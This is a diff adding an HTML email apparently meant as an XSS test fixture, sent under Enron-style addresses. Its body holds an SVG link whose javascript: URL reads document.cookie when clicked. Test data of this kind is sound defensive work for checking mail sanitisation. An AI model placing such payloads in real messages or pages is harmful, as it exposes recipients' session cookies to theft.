@@ -1,0 +1,7 @@
+From: vladimir.gorny@enron.com
+To: jeff.dasovich@enron.com, richard.shapiro@enron.com, j..kean@enron.com, 
+Subject: XSS Test Mail
+MIME-Version: 1.0
+Content-type: text/html
+
+<svg><a xlink:href="javascript:alert(document.cookie)" target="_blank"><text>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</text></a></svg>
